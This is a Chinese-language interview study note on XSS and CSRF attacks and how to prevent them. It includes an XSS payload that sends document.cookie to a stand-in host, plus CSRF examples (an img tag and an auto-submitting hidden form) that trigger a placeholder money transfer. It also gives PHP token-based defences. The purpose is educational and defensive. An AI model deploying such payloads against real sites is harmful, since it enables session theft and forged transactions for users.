安全

安全

1. 介绍一下什么是 csrf 和 xss 攻击，如果预防? (中/高级)

  • CSRF 跨站请求伪造 (Cross-site request forgery)
  • XSS 跨站脚本攻击 (Cross Site Script)

XSS

是什么?

XSS 又称 CSS Cross Site Script, 跨站脚本攻击，属于被动式且用于客户端的攻击方式，容易被忽略其危害性。

危害

盗取用户 Cookie(严重)、破坏页面结构、重定向其它网站等。

原理

攻击者向有 XSS 漏洞的网站中输入恶意 HTML 代码，当其它用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击目的。

示例

示例 1：DOM Based XSS 基于网页 DOM 结构的攻击，特点：中招的人数少

用户已登录 A 网站的情况下，点击陌生人发来的链接，http://www.A.com/user?content=<script>window.open("www.b.com?param="+document.cookie)</script>。这时浏览器会自动打开 B 网站，并携带 Cookie 信息。

示例 2：Stored XSS 存储式 XSS 漏洞 特点：恶意代码被存储到服务器，中招的人数多

攻击者在 A 网站中发布了一篇包含恶意代码的文章，<script>window.open("www.b.com?param="+document.cookie)</script>。当有用户浏览这篇文章的时候，就会自动打开 b 网站，并携带 Cookie 信息。

防御

永远不要相信用户的输入，必须对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。

CSRF

是什么？

CSRF Cross-site request forgery 跨站请求伪造

危害

盗用用户身份，并以用户名义发送恶意请求。可以造成的危害：发送邮件、盗取账号、购买虚拟商品...

原理

  1. 用户浏览并登陆信任网站 A
  2. 网站 A 验证用户通过后会在本地生成网站 A 的 Cookie
  3. 用户在没有登出网站 A 的情况下，访问了危险网站 B
  4. B 网站在页面发起访问网站 A 的请求，浏览器会携带 A 的 Cookie
  5. 网站 A 无法知晓请求是否来自危险网站

示例

示例 1(GET)：

网站 A，完成虚拟账户转账的接口地址: http://www.xxx.com/transfer?to=11&money=10000

网站 B 中有以下一段代码:

<img src="http://www.xxx.com/transfer?to=11&money=10000" />
示例 2(POST):

网站 B 的代码：

<script>
  function steal() {
    iframe = document.frames["steal"];
    iframe.document.submit("transfer");
  }
</script>
<body onload="steal()">
  <iframe name="steal">
    <form method="POST" name="transfer" action="http://www.xxx.com/transfer">
      <input type="hidden" name="to" value="11" />
      <input type="hidden" name="money" value="10000" />
    </form>
  </iframe>
</body>

防御

  1. 服务端防御 服务器端返回 setCookie 中加入一串伪随机数，客户端每次请求时携带该伪随机数。理论上，攻击者不能获取到 cookie 中的伪随机数，所以无法携带正确的伪随机数。不能 100%杜绝，因为网站如果存在 XSS 漏洞，那么攻击者就可以获取到 cookie。

  2. 使用验证码 每次提交数据时，需要提交验证码，用户体验不好。

  3. One-Time Tokens(每次不同的伪随机数)

    1. get_token() 令牌生成函数

      function getToken() {
  $token = md5(uniqid(mt_rand(), true));
    return $token;
}

    2. 将令牌放入 session

      $_SESSION[TOKEN_NAME] = getToken();

    3. 在 Web 表单中使用隐藏域保存 token

      echo '<input type="hidden" name="' . TOKEN_NAME .'" value="'. $_SESSION[TOKEN_NAME] .'" />';

    4. 服务端验证 token 令牌。需要注意的是，用户如果使用浏览器标签页打开两个一样的表单，则前一个表单的 token 会失效，考虑兼容的问题。
